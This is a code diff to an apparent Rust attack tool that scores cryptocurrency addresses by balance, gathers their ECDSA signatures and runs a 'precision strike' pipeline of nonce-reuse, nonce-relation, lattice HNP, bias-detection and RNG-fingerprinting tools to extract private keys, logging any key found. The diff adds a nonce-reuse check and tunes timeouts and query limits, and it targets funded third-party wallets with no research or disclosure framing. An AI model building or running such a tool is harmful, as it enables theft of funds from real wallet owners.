@@ -58,7 +58,7 @@ impl WorkerState {
 async fn run_scorer(state: &mut WorkerState) -> Result<()> {
     state.log("Ranking all addresses based on unified scoring system...");
     let conn = Connection::open(DB_FILE)?;
-    conn.pragma_update(None, "busy_timeout", &10000)?;
+    conn.pragma_update(None, "busy_timeout", &30000)?;
     
     let mut stmt = conn.prepare("SELECT address FROM addresses WHERE sigs_fetched = 1 AND balance >= 20.0")?;
     let addresses: Vec<String> = stmt.query_map([], |row| row.get(0))?.flatten().collect();
@@ -154,7 +154,7 @@ async fn run_neural_inference(_state: &WorkerState, r_values: &[BigInt]) -> Resu
 // --- Striker Logic ---
 async fn run_striker(state: &mut WorkerState) -> Result<bool> {
     let mut conn = Connection::open(DB_FILE)?;
-    conn.pragma_update(None, "busy_timeout", &10000)?;
+    conn.pragma_update(None, "busy_timeout", &30000)?;
     
     // 1. Find targets and mark them as processing immediately in a transaction
     let targets: Vec<(String, f64, i64, String, f64)> = {
@@ -191,12 +191,12 @@ async fn run_striker(state: &mut WorkerState) -> Result<bool> {
     for (addr, _bal, count, pubkey, score) in targets {
         state.log(&format!("LAUNCHING PRECISION STRIKE: {} (Score: {:.3}, {} sigs)", addr, score, count));
         
-        let mut sig_stmt = conn.prepare("SELECT DISTINCT r_hex, s_hex, z_hex FROM signatures WHERE address = ?1")?;
+        let mut sig_stmt = conn.prepare("SELECT DISTINCT r_hex, s_hex, z_hex FROM signatures WHERE address = ?1 ORDER BY id DESC LIMIT 256")?;
         let sigs_for_json: Vec<Value> = sig_stmt.query_map(params![&addr], |r| {
             Ok(serde_json::json!({ "r": r.get::<_, String>(0)?, "s": r.get::<_, String>(1)?, "z": r.get::<_, String>(2)? }))
         })?.collect::<rusqlite::Result<Vec<_>>>()?;
 
-        let sigs_for_features: Vec<BigInt> = conn.prepare("SELECT DISTINCT r_int FROM signatures WHERE address = ?1")?
+        let sigs_for_features: Vec<BigInt> = conn.prepare("SELECT DISTINCT r_int FROM signatures WHERE address = ?1 ORDER BY id DESC LIMIT 256")?
             .query_map(params![&addr], |r| r.get::<_, String>(0))?
             .collect::<rusqlite::Result<Vec<String>>>()?
             .into_iter()
@@ -204,10 +204,31 @@ async fn run_striker(state: &mut WorkerState) -> Result<bool> {
             .collect();
         
         let sigs_file = format!("temp_sigs_{}.json", addr);
-        std::fs::write(&sigs_file, serde_json::to_string(&sigs_for_json)?)?;
+        let _ = std::fs::write(&sigs_file, serde_json::to_string(&sigs_for_json)?);
 
-        state.log("  [1/5] Nonce Relation Attack...");
-        if let Ok(Ok(out1)) = time::timeout(Duration::from_secs(300), tokio::process::Command::new("./target/release/nonce_relation_rs").arg("--sigs").arg(&sigs_file).arg("--pubkey").arg(&pubkey).output()).await {
+        // --- Step 0: Fast R-REUSE Check ---
+        state.log("  [0/6] Checking for Nonce Reuse (R-Reuse)...");
+        for i in 0..sigs_for_json.len() {
+            for j in (i+1)..sigs_for_json.len() {
+                let r1 = sigs_for_json[i]["r"].as_str().unwrap_or("");
+                let r2 = sigs_for_json[j]["r"].as_str().unwrap_or("");
+                let s1 = sigs_for_json[i]["s"].as_str().unwrap_or("");
+                let s2 = sigs_for_json[j]["s"].as_str().unwrap_or("");
+                let z1 = sigs_for_json[i]["z"].as_str().unwrap_or("");
+                let z2 = sigs_for_json[j]["z"].as_str().unwrap_or("");
+
+                if r1 == r2 && s1 != s2 && !r1.is_empty() {
+                    state.log(&format!("  [!!!] R-REUSE DETECTED for {}!", addr));
+                    let _ = conn.execute(
+                        "INSERT OR IGNORE INTO vulnerabilities (address, type, severity, found_at, details) VALUES (?1, ?2, ?3, datetime('now'), ?4)",
+                        params![addr, "Nonce Reuse", "CRITICAL", "Identical R values with different S/Z found. Recovery imminent."],
+                    );
+                }
+            }
+        }
+
+        state.log("  [1/6] Nonce Relation Attack...");
+        if let Ok(Ok(out1)) = time::timeout(Duration::from_secs(600), tokio::process::Command::new("./target/release/nonce_relation_rs").arg("--sigs").arg(&sigs_file).arg("--pubkey").arg(&pubkey).output()).await {
             let stdout = String::from_utf8_lossy(&out1.stdout);
             if stdout.contains("SUCCESS") { 
                 if let Some(key_line) = stdout.lines().find(|l| l.contains("Private Key:")) {
@@ -248,7 +269,7 @@ async fn run_striker(state: &mut WorkerState) -> Result<bool> {
         } else { state.log("  [!] Nonce Relation Attack timed out."); }
 
         state.log("  [2/5] Spectral Bias Detection (FFT)...");
-        if let Ok(Ok(out2)) = time::timeout(Duration::from_secs(300), tokio::process::Command::new("./target/release/bias_detector_rs").arg(&addr).output()).await {
+        if let Ok(Ok(out2)) = time::timeout(Duration::from_secs(600), tokio::process::Command::new("./target/release/bias_detector_rs").arg(&addr).output()).await {
             let stdout = String::from_utf8_lossy(&out2.stdout);
             if stdout.contains("Potential Bias") { 
                 state.log(&format!("  [!] BIAS DETECTED for {}: Spectral peak identified.", addr)); 
@@ -260,7 +281,7 @@ async fn run_striker(state: &mut WorkerState) -> Result<bool> {
         } else { state.log("  [!] Spectral Bias Detection timed out."); }
 
         state.log("  [3/5] Lattice HNP (LLL)...");
-        if let Ok(Ok(out3)) = time::timeout(Duration::from_secs(300), tokio::process::Command::new("./target/release/lattice_attack_rs").arg(&sigs_file).arg(&addr).arg("8").output()).await {
+        if let Ok(Ok(out3)) = time::timeout(Duration::from_secs(600), tokio::process::Command::new("./target/release/lattice_attack_rs").arg(&sigs_file).arg(&addr).arg("8").output()).await {
             let stdout = String::from_utf8_lossy(&out3.stdout);
             if stdout.contains("SUCCESS") { 
                 if let Some(key_line) = stdout.lines().find(|l| l.contains("Private Key Found:")) {
@@ -301,7 +322,7 @@ async fn run_striker(state: &mut WorkerState) -> Result<bool> {
         } else { state.log("  [!] Lattice HNP Attack timed out."); }
 
         state.log("  [4/6] Physics Engine RNG Fingerprinting...");
-        if let Ok(Ok(out_chaos)) = time::timeout(Duration::from_secs(300), tokio::process::Command::new("./target/release/physics_engine_rs").arg(&sigs_file).output()).await {
+        if let Ok(Ok(out_chaos)) = time::timeout(Duration::from_secs(600), tokio::process::Command::new("./target/release/physics_engine_rs").arg(&sigs_file).output()).await {
             let stdout = String::from_utf8_lossy(&out_chaos.stdout);
             if stdout.contains("POTENTIAL RNG VULNERABILITY DETECTED") { 
                 state.log(&format!("  [!] RNG FINGERPRINT VULNERABILITY DETECTED for {}.", addr)); 
@@ -315,7 +336,7 @@ async fn run_striker(state: &mut WorkerState) -> Result<bool> {
         } else { state.log("  [!] Physics Engine Scan timed out."); }
 
         state.log("  [5/6] Bleichenbacher Fourier Analysis...");
-        if let Ok(Ok(out4)) = time::timeout(Duration::from_secs(300), tokio::process::Command::new("./target/release/bleichenbacher_fourier").arg(&sigs_file).output()).await {
+        if let Ok(Ok(out4)) = time::timeout(Duration::from_secs(600), tokio::process::Command::new("./target/release/bleichenbacher_fourier").arg(&sigs_file).output()).await {
             let stdout = String::from_utf8_lossy(&out4.stdout);
             if stdout.contains("POTENTIAL HIT") { 
                 state.log(&format!("  [!] BLEICHENBACHER-STYLE BIAS DETECTED for {}.", addr)); 
@@ -327,18 +348,22 @@ async fn run_striker(state: &mut WorkerState) -> Result<bool> {
         } else { state.log("  [!] Bleichenbacher Fourier Analysis timed out."); }
 
         state.log("  [6/6] Neural Anomaly Detection (Real ONNX Model)...");
-        match run_neural_inference(state, &sigs_for_features).await {
-            Ok(prob) => {
-                state.log(&format!("    P(vulnerable) from model: {:.4}", prob));
-                if prob > 0.8 {
-                    state.log(&format!("    [!!!] NEURAL ANOMALY DETECTED for {}: High non-randomness probability.", addr));
-                    let _ = conn.execute(
-                        "INSERT OR IGNORE INTO vulnerabilities (address, type, severity, found_at, details) VALUES (?1, ?2, ?3, datetime('now'), ?4)",
-                        params![addr, "Neural Anomaly", "High", format!("P(vulnerable)={:.4}", prob)],
-                    );
+        if sigs_for_features.len() < 2 {
+            state.log("    Skipping neural inference: Insufficient unique nonces for statistical analysis.");
+        } else {
+            match run_neural_inference(state, &sigs_for_features).await {
+                Ok(prob) => {
+                    state.log(&format!("    P(vulnerable) from model: {:.4}", prob));
+                    if prob > 0.8 {
+                        state.log(&format!("    [!!!] NEURAL ANOMALY DETECTED for {}: High non-randomness probability.", addr));
+                        let _ = conn.execute(
+                            "INSERT OR IGNORE INTO vulnerabilities (address, type, severity, found_at, details) VALUES (?1, ?2, ?3, datetime('now'), ?4)",
+                            params![addr, "Neural Anomaly", "High", format!("P(vulnerable)={:.4}", prob)],
+                        );
+                    }
                 }
+                Err(e) => state.log(&format!("    Neural inference error: {}", e)),
             }
-            Err(e) => state.log(&format!("    Neural inference error: {}", e)),
         }
 
         let _ = std::fs::remove_file(&sigs_file);
@@ -356,7 +381,7 @@ async fn run_striker(state: &mut WorkerState) -> Result<bool> {
 async fn run_scanner(state: &mut WorkerState) -> Result<()> {
     state.log("Checking target queue status...");
     let conn = Connection::open(DB_FILE)?;
-    conn.pragma_update(None, "busy_timeout", &10000)?;
+    conn.pragma_update(None, "busy_timeout", &30000)?;
     
     let unscanned: i64 = conn.query_row(
         "SELECT COUNT(*) FROM addresses WHERE (sigs_scanned = 0 OR sigs_scanned IS NULL) AND vulnerability_score > 0",
@@ -373,7 +398,7 @@ async fn run_scanner(state: &mut WorkerState) -> Result<()> {
 }
 async fn run_analyzer(state: &mut WorkerState) -> Result<()> {
     let mut conn = Connection::open(DB_FILE)?;
-    conn.pragma_update(None, "busy_timeout", &10000)?;
+    conn.pragma_update(None, "busy_timeout", &30000)?;
     
     let mut stmt = conn.prepare("SELECT address FROM addresses WHERE sigs_fetched = 1 AND (sigs_scanned = 0 OR sigs_scanned IS NULL) AND balance >= 20.0 LIMIT 20")?;
     let addresses: Vec<String> = stmt.query_map([], |row| row.get(0))?.flatten().collect();
@@ -400,7 +425,6 @@ async fn run_analyzer(state: &mut WorkerState) -> Result<()> {
 
         if sigs.is_empty() {
             state.log(&format!("Analyzer: No signatures in DB for {}", addr));
-            conn.execute("UPDATE addresses SET sigs_scanned = 1 WHERE address = ?1", params![addr])?;
             continue;
         }
 
@@ -466,7 +490,7 @@ async fn main() -> Result<()> {
             Ok(c) => c,
             Err(_) => return,
         };
-        let mut interval = time::interval(Duration::from_secs(30));
+        let mut interval = time::interval(Duration::from_secs(60));
         loop {
             interval.tick().await;
             sys.refresh_cpu_usage();
